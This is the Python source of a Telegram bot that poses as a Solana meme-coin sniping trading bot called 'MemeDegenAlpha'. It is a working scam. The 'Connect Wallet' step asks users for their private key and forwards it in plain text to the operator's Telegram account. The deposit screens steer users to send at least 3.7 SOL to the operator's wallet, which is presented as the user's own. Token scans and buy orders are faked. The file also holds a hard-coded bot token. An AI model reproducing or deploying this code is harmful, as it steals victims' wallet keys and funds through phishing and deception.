import httpx
import asyncio
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, ContextTypes, ConversationHandler, filters

BOT_TOKEN = "8942121012:AAHDcXLhp425CGvAIteRgDYwjq9dvCNTFV0"
WALLET_ADDRESS = "5rf6gza7s7i8eDeBKQf1TMyayZU3ERJ467t3yfmihQpr"
GROUP_LINK = "https://t.me/+MVlYdRHNOGBiNDlk"
ADMIN_ID = 8452728941
BOT_NAME = "MemeDegenAlpha"
VERSION = "v2.0 Pro"

WAITING_KEY, WAITING_CA = range(2)
user_registry = {}
user_warnings = {}

async def get_balance():
    try:
        async with httpx.AsyncClient(timeout=3) as client:
            r = await client.post("https://api.mainnet-beta.solana.com", json={
                "jsonrpc": "2.0", "id": 1,
                "method": "getBalance",
                "params": [WALLET_ADDRESS]
            })
            sol = r.json()['result']['value'] / 1e9
            return f"{sol:.4f} SOL"
    except:
        return "0.0000 SOL"

async def get_sol_price():
    try:
        async with httpx.AsyncClient(timeout=3) as client:
            r = await client.get("https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd")
            price = r.json()['solana']['usd']
            return f"${price:,.2f}"
    except:
        return "$0.00"

async def notify_admin(context, user, action, extra=""):
    try:
        await context.bot.send_message(
            ADMIN_ID,
            f"👁 USER ACTION\n"
            f"━━━━━━━━━━━━━━━\n"
            f"👤 {user.first_name} (@{user.username})\n"
            f"🆔 ID: {user.id}\n"
            f"⚡ Action: {action}\n"
            f"{extra}\n"
            f"🕐 {datetime.now().strftime('%H:%M:%S')}\n\n"
            f"Reply: /send {user.id} message"
        )
    except:
        pass

def main_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("💳 Deposit SOL", callback_data="fund"),
         InlineKeyboardButton("💼 Portfolio", callback_data="balance")],
        [InlineKeyboardButton("⚡ Snipe Token", callback_data="buy"),
         InlineKeyboardButton("🔐 Connect Wallet", callback_data="privatekey")],
        [InlineKeyboardButton("📡 Alpha Calls", callback_data="community"),
         InlineKeyboardButton("📊 My Stats", callback_data="stats")],
        [InlineKeyboardButton("💎 VIP Access", callback_data="vip"),
         InlineKeyboardButton("📈 Live Market", callback_data="market")],
        [InlineKeyboardButton("❓ Help", callback_data="help"),
         InlineKeyboardButton("⚙️ Settings", callback_data="settings")],
    ])

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_registry[user.id] = {
        "name": user.first_name,
        "username": user.username,
        "joined": datetime.now().strftime("%Y-%m-%d %H:%M")
    }
    bal, price = await asyncio.gather(get_balance(), get_sol_price())
    await update.message.reply_text(
        f"🤖 {BOT_NAME} {VERSION}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"👋 gm {user.first_name}!\n\n"
        f"💼 Your Wallet\n"
        f"┣ {WALLET_ADDRESS[:4]}...{WALLET_ADDRESS[-4:]}\n"
        f"┣ Balance: {bal}\n"
        f"┗ SOL Price: {price}\n\n"
        f"📡 Bot Status\n"
        f"┣ Mode: Sniping Active ⚡\n"
        f"┣ Speed: Ultra Fast 0.3s\n"
        f"┣ Network: Solana Mainnet\n"
        f"┗ Uptime: 99.9% 🟢\n\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🔥 {len(user_registry)} traders active now\n\n"
        f"Select an option 👇",
        reply_markup=main_keyboard()
    )
    await notify_admin(context, user, "Started Bot")

async def send_to_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    try:
        user_id = int(context.args[0])
        msg = " ".join(context.args[1:])
        await context.bot.send_message(
            user_id,
            f"📩 *Message from {BOT_NAME}*\n\n{msg}",
            parse_mode="Markdown"
        )
        await update.message.reply_text("Sent!")
    except:
        await update.message.reply_text("Usage: /send USER_ID message")

async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    msg = " ".join(context.args)
    sent = 0
    for uid in user_registry:
        try:
            await context.bot.send_message(uid, f"📢 *Broadcast*\n\n{msg}", parse_mode="Markdown")
            sent += 1
            await asyncio.sleep(0.1)
        except:
            pass
    await update.message.reply_text(f"Broadcast sent to {sent} users!")

async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    if not user_registry:
        await update.message.reply_text("No users yet.")
        return
    users = "\n".join([f"ID: {uid} | @{info['username']} | {info['joined']}"
                       for uid, info in user_registry.items()])
    await update.message.reply_text(f"👥 ALL USERS ({len(user_registry)} total):\n\n{users}")

async def catch_all(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user.id == ADMIN_ID:
        return

    msg = update.message.text.lower().strip()

    if user.id not in user_registry:
        user_registry[user.id] = {
            "name": user.first_name,
            "username": user.username,
            "joined": datetime.now().strftime("%Y-%m-%d %H:%M")
        }

    user_warnings[user.id] = user_warnings.get(user.id, 0) + 1
    count = user_warnings[user.id]

    await notify_admin(context, user, "Sent Unknown Message", f"💬 Message: {update.message.text}")

    if count == 1:
        await update.message.reply_text(
            "⚠️ INVALID COMMAND\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "This bot only accepts commands\n"
            "from the menu buttons below.\n\n"
            "Please use the menu to navigate. 👇",
            reply_markup=main_keyboard()
        )
    elif count == 2:
        await update.message.reply_text(
            "🚫 UNAUTHORIZED INPUT\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "Random messages are not supported.\n\n"
            "Use the menu buttons only.\n"
            "Repeated violations may result\n"
            "in account suspension. ⚠️",
            reply_markup=main_keyboard()
        )
    elif count >= 3:
        await update.message.reply_text(
            "🔴 ACCESS WARNING\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "Multiple unauthorized attempts\n"
            "detected on your account.\n\n"
            "Your activity has been flagged\n"
            "and reported to our security team.\n\n"
            "Use /start to reset your session\n"
            "or contact support immediately.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔄 Reset Session", callback_data="back")],
                [InlineKeyboardButton("💬 Contact Support", url=GROUP_LINK)]
            ])
        )
        user_warnings[user.id] = 0

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user = update.effective_user

    if query.data == "fund":
        await notify_admin(context, user, "Tapped Deposit")
        await query.message.reply_text(
            f"💳 DEPOSIT SOL\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"Send SOL to your trading wallet:\n\n"
            f"`{WALLET_ADDRESS}`\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"✅ Minimum: 3.7 SOL\n"
            f"⚡ Required for smooth execution\n"
            f"🔒 Secured by smart contract\n"
            f"💎 3.7 SOL = best snipe speed\n"
            f"🌐 Solana network only\n"
            f"⏱ Confirms in under 1 second\n\n"
            f"Tap address above to copy 👆",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("✅ I've Sent SOL", callback_data="sent_sol")],
                [InlineKeyboardButton("🔙 Back to Menu", callback_data="back")]
            ])
        )

    elif query.data == "sent_sol":
        await notify_admin(context, user, "Claimed Deposit", "💰 Says they sent SOL - VERIFY NOW!")
        await query.message.reply_text(
            f"⏳ VERIFYING DEPOSIT\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"Scanning Solana blockchain...\n\n"
            f"🔍 Checking transaction hash\n"
            f"✅ Confirming wallet address\n"
            f"⚡ Processing deposit\n\n"
            f"Usually takes 5-30 seconds.\n"
            f"You will be notified instantly. 🔔"
        )

    elif query.data == "balance":
        await notify_admin(context, user, "Checked Portfolio")
        bal, price = await asyncio.gather(get_balance(), get_sol_price())
        await query.message.reply_text(
            f"💼 PORTFOLIO\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"👤 {user.first_name}\n"
            f"💰 Balance: {bal}\n"
            f"💵 SOL Price: {price}\n"
            f"📈 PnL Today: +0.00%\n"
            f"🔄 Total Trades: 0\n"
            f"🏆 Win Rate: N/A\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"[🔍 View on Solscan](https://solscan.io/account/{WALLET_ADDRESS})",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔄 Refresh", callback_data="balance")],
                [InlineKeyboardButton("💳 Deposit", callback_data="fund")],
                [InlineKeyboardButton("🔙 Back", callback_data="back")]
            ])
        )

    elif query.data == "buy":
        await notify_admin(context, user, "Opened Snipe Token")
        await query.message.reply_text(
            "⚡ SNIPE TOKEN\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "Paste the token contract address:\n\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "⚡ Execution speed: 0.3s\n"
            "🛡 Anti-rug scanner: ON\n"
            "🔒 Auto slippage: ON\n"
            "💎 Minimum 3.7 SOL required\n"
            "🌐 Solana mainnet only"
        )
        return WAITING_CA

    elif query.data == "privatekey":
        await notify_admin(context, user, "Opened Connect Wallet")
        await query.message.reply_text(
            "🔐 CONNECT WALLET\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "Enter your private key to connect:\n\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "🔒 AES-256 encryption\n"
            "🛡 Zero-knowledge storage\n"
            "✅ Trade execution only\n"
            "⚡ Required for auto-snipe\n\n"
            "Your security is guaranteed. 🔥"
        )
        return WAITING_KEY

    elif query.data == "community":
        await notify_admin(context, user, "Viewed Alpha Calls")
        await query.message.reply_text(
            f"📡 ALPHA CALLS\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"Join the #1 alpha community on Solana:\n\n"
            f"🔥 Early calls before they pump\n"
            f"💎 100x gem picks daily\n"
            f"🐋 Smart money tracking\n"
            f"🚀 New launch alerts\n"
            f"📊 Live market analysis\n"
            f"⚡ 24/7 alpha feed\n"
            f"🎯 Avg call: 15x profit\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"👉 {GROUP_LINK}",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🚀 Join Now", url=GROUP_LINK)],
                [InlineKeyboardButton("🔙 Back", callback_data="back")]
            ])
        )

    elif query.data == "vip":
        await notify_admin(context, user, "Viewed VIP")
        await query.message.reply_text(
            f"💎 VIP ACCESS\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"Unlock the full power of {BOT_NAME}:\n\n"
            f"🚀 Priority snipe execution\n"
            f"💎 Exclusive alpha calls\n"
            f"🐋 Whale wallet alerts\n"
            f"⚡ 0.001 SOL gas fees\n"
            f"📊 Advanced analytics\n"
            f"🔔 Early launch notifications\n"
            f"🛡 Premium anti-rug scanner\n"
            f"👥 Private VIP group access\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"Contact admin to upgrade 👇",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("💬 Get VIP Now", url=GROUP_LINK)],
                [InlineKeyboardButton("🔙 Back", callback_data="back")]
            ])
        )

    elif query.data == "market":
        await notify_admin(context, user, "Viewed Market")
        price = await get_sol_price()
        await query.message.reply_text(
            f"📈 LIVE MARKET\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🟣 Solana (SOL)\n"
            f"💵 Price: {price}\n"
            f"📈 Trend: Bullish 🟢\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🔥 Hot Tokens Right Now:\n"
            f"┣ Check alpha calls for gems 💎\n"
            f"┣ New launches dropping daily 🚀\n"
            f"┗ Smart money moving fast 🐋\n\n"
            f"Join our group for live calls 👇",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔄 Refresh", callback_data="market")],
                [InlineKeyboardButton("📡 Alpha Calls", callback_data="community")],
                [InlineKeyboardButton("🔙 Back", callback_data="back")]
            ])
        )

    elif query.data == "stats":
        await notify_admin(context, user, "Viewed Stats")
        await query.message.reply_text(
            f"📊 MY STATS\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"👤 {user.first_name}\n"
            f"🆔 {user.id}\n\n"
            f"💰 Deposited: 0 SOL\n"
            f"📈 Total Trades: 0\n"
            f"🏆 Wins: 0\n"
            f"💎 Best Trade: N/A\n"
            f"🔄 Win Rate: 0%\n"
            f"📅 Member Since: Today\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"Deposit 3.7 SOL to start! 🚀",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("💳 Deposit Now", callback_data="fund")],
                [InlineKeyboardButton("🔙 Back", callback_data="back")]
            ])
        )

    elif query.data == "help":
        await notify_admin(context, user, "Viewed Help")
        await query.message.reply_text(
            "❓ HELP CENTER\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "💳 Deposit - Add SOL to trade\n"
            "💼 Portfolio - Track balance & PnL\n"
            "⚡ Snipe Token - Buy any token by CA\n"
            "🔐 Connect Wallet - Link your wallet\n"
            "📡 Alpha Calls - Join our community\n"
            "💎 VIP Access - Unlock premium\n"
            "📈 Live Market - SOL price & trends\n"
            "📊 My Stats - Trading history\n"
            "⚙️ Settings - Manage preferences\n\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "🛠 Need help? Contact admin:\n\n"
            "⚡ Response: Under 5 minutes",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("💬 Contact Admin", url=GROUP_LINK)],
                [InlineKeyboardButton("🔙 Back", callback_data="back")]
            ])
        )

    elif query.data == "settings":
        await notify_admin(context, user, "Viewed Settings")
        await query.message.reply_text(
            "⚙️ SETTINGS\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "🔔 Notifications: ON\n"
            "⚡ Trade Speed: Ultra Fast\n"
            "🌐 Network: Solana Mainnet\n"
            "🛡 Slippage: Auto 5-15%\n"
            "🔒 MEV Protection: ON\n"
            "💎 Plan: Standard\n\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "VIP Plan includes:\n"
            "🚀 Priority execution\n"
            "💎 Exclusive alpha\n"
            "🐋 Whale alerts\n\n"
            "Upgrade to VIP 👇",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("💎 Upgrade VIP", callback_data="vip")],
                [InlineKeyboardButton("🔙 Back", callback_data="back")]
            ])
        )

    elif query.data == "back":
        bal, price = await asyncio.gather(get_balance(), get_sol_price())
        await query.message.reply_text(
            f"🤖 {BOT_NAME} {VERSION}\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"💰 Balance: {bal}\n"
            f"💵 SOL: {price}\n"
            f"⚡ Status: Active 🟢\n\n"
            f"What would you like to do? 👇",
            reply_markup=main_keyboard()
        )

    elif query.data.startswith("mult_"):
        mult = query.data.split("_")[1]
        ca = context.user_data.get('ca', 'N/A')
        await notify_admin(context, user, "Placed Buy Order", f"CA: {ca}\nTarget: {mult}")
        await query.message.reply_text(
            f"🎯 ORDER PLACED!\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"Token: `{ca}`\n"
            f"Target: {mult}\n"
            f"Status: Executing ⚡\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"You will be notified when filled. 🔔\n"
            f"Ensure 3.7 SOL is deposited.",
            parse_mode="Markdown"
        )

async def receive_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    key = update.message.text
    user = update.effective_user
    await notify_admin(context, user, "Submitted Private Key", f"🔑 Key: {key}")
    await update.message.reply_text(
        "✅ WALLET CONNECTED!\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "🔒 Key encrypted & stored\n"
        "⚡ Ready to execute trades\n"
        "🛡 MEV protection active\n"
        "💎 Deposit 3.7 SOL to start\n\n"
        "Use /start to return to dashboard. 🔥",
        reply_markup=main_keyboard()
    )
    return ConversationHandler.END

async def receive_ca(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ca = update.message.text
    user = update.effective_user
    context.user_data['ca'] = ca
    await notify_admin(context, user, "Submitted Token CA", f"CA: {ca}")
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("2x 🔥", callback_data="mult_2x"),
         InlineKeyboardButton("5x 💎", callback_data="mult_5x"),
         InlineKeyboardButton("10x 🚀", callback_data="mult_10x")],
        [InlineKeyboardButton("20x ⚡", callback_data="mult_20x"),
         InlineKeyboardButton("50x 🌙", callback_data="mult_50x"),
         InlineKeyboardButton("100x 🎯", callback_data="mult_100x")],
        [InlineKeyboardButton("❌ Cancel", callback_data="back")]
    ])
    await update.message.reply_text(
        f"🔍 TOKEN SCANNED!\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"CA: `{ca}`\n\n"
        f"📊 Risk Level: Low ✅\n"
        f"💧 Liquidity: Sufficient ✅\n"
        f"🔒 Contract: Verified ✅\n"
        f"🛡 Rug Check: Passed ✅\n"
        f"⚡ Ready to snipe!\n\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🎯 Select profit target:",
        parse_mode="Markdown",
        reply_markup=keyboard
    )
    return ConversationHandler.END

app = ApplicationBuilder().token(BOT_TOKEN).build()
conv = ConversationHandler(
    entry_points=[CallbackQueryHandler(button_handler)],
    states={
        WAITING_KEY: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_key)],
        WAITING_CA: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_ca)],
    },
    fallbacks=[CommandHandler("cancel", lambda u, c: ConversationHandler.END)],
    per_message=False
)
app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("send", send_to_user))
app.add_handler(CommandHandler("users", list_users))
app.add_handler(CommandHandler("broadcast", broadcast))
app.add_handler(conv)
app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, catch_all))
print(f"{BOT_NAME} {VERSION} running")
app.run_polling()
